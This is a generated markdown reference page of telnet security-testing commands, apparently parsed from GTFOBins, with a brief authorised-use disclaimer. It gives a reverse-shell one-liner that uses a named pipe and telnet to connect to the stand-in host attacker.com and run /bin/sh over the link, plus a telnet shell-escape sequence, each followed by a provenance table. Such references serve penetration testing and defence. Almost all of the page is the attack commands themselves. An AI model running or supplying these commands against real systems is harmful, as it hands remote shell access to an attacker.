---
parsed_by: focuslocust
source: commands
type: generated
---
# telnet Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## telnet

Tool page: [telnet](../../tools/linux/telnet.md)

### reverse-shell

```text
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet` |
| Evidence | Function example preserved from source parser. |

### shell

```text
telnet
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/telnet` |
| Evidence | Function example preserved from source parser. |
